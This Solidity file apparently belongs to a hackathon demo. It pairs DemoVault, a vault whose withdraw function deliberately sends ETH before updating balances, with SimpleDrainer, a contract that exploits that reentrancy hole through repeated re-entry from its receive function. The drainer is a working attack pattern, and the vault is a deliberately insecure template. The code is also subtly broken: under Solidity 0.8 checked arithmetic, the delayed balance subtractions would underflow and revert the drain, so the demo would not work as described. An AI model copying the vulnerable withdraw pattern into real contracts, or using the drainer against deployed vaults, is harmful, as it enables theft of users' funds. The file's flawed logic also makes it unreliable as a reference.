// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/utils/Pausable.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

/**
 * @title DemoVault
 * @notice Vulnerable vault for Sentinel demo - holds ETH and can be drained
 * @dev Intentionally has reentrancy vulnerability for hackathon demonstration
 */
contract DemoVault is Pausable, AccessControl {
    
    bytes32 public constant PAUSER_ROLE = keccak256("PAUSER_ROLE");
    
    mapping(address => uint256) public balanceOf;
    uint256 public totalDeposits;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);
    event Drained(address indexed attacker, uint256 amount);
    
    constructor(address admin) {
        _grantRole(DEFAULT_ADMIN_ROLE, admin);
        _grantRole(PAUSER_ROLE, admin);
    }
    
    receive() external payable {
        deposit();
    }
    
    function deposit() public payable whenNotPaused {
        require(msg.value > 0, "Must send ETH");
        balanceOf[msg.sender] += msg.value;
        totalDeposits += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @notice Vulnerable withdraw - external call before state update!
     * @dev This allows reentrancy attacks
     */
    function withdraw(uint256 amount) external whenNotPaused {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        
        // ⚠️ VULNERABILITY: External call BEFORE state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // State update happens AFTER external call (WRONG!)
        balanceOf[msg.sender] -= amount;
        totalDeposits -= amount;
        
        emit Withdraw(msg.sender, amount);
    }
    
    /**
     * @notice Drain function for demo - allows owner to rescue funds
     */
    function emergencyWithdraw() external onlyRole(DEFAULT_ADMIN_ROLE) {
        uint256 balance = address(this).balance;
        require(balance > 0, "No funds");
        
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
        
        emit Drained(msg.sender, balance);
    }
    
    function pause() external onlyRole(PAUSER_ROLE) {
        _pause();
    }
    
    function unpause() external onlyRole(DEFAULT_ADMIN_ROLE) {
        _unpause();
    }
}

/**
 * @title SimpleDrainer
 * @notice Simple contract to drain the DemoVault via reentrancy
 */
contract SimpleDrainer {
    DemoVault public target;
    address public owner;
    uint256 public drainAmount;
    uint256 public drainCount;
    
    constructor(address payable _target) {
        target = DemoVault(_target);
        owner = msg.sender;
    }
    
    function attack(uint256 _drainAmount) external payable {
        drainAmount = _drainAmount;
        drainCount = 0;
        
        // First deposit to get balance
        target.deposit{value: msg.value}();
        
        // Start the reentrancy attack
        target.withdraw(_drainAmount);
    }
    
    receive() external payable {
        // Re-enter until vault is empty or we've hit limit
        if (address(target).balance >= drainAmount && drainCount < 10) {
            drainCount++;
            target.withdraw(drainAmount);
        }
    }
    
    function withdrawToOwner() external {
        require(msg.sender == owner, "Not owner");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success);
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
